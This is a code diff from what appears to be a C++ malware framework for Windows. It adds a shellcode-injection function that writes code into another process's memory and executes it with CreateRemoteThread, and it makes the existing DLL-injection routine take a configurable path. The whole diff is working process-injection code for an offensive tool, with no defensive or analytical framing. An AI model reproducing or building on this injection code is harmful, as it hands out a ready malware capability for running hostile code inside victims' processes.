@@ -4,6 +4,7 @@
 #include <psapi.h>
 #include <iostream>
 #include "Process.h"
+#include "Utilities.h"
 
 bool Process::InjectDLL(DLL dll) {
 	return InjectDll_CreateRemoteThread(dll);
@@ -19,6 +20,28 @@ bool Process::InjectDLL(DLL payload, int injectionType) {
 			std::cout << "Invalid injection method\n";
 			return false;
 	}
+}
+
+bool Process::InjectShellcode(Shellcode shellcode) {
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	std::cout << "Injecting shellcode into process\n";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	if (!remoteBuffer)
+		return false;
+
+	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode.get_char(), shellcode.length(), NULL))
+		return false;
+	if (!CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL))
+		return false;
+	CloseHandle(processHandle);
+
+	return true;
 }
 
 typedef DWORD(WINAPI* prototype_NtCreateThreadEx)(
@@ -52,7 +75,9 @@ typedef DWORD(WINAPI* prototype_RtlCreateUserThread)(
 bool Process::InjectDll_CreateRemoteThread(DLL dll) {
 
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	LPCWSTR dllPath = L"C:\\Users\\chase\\Desktop\\malware-framework\\src\\core\\x64\\Debug\\MSGDLL.dll";
+	
+	std::wstring stemp = Utilities::string_to_wstring(dll.path).c_str();
+	LPCWSTR dllPath = stemp.c_str();
 
 	std::cout << "Using dll path " << dllPath << "\n";
 
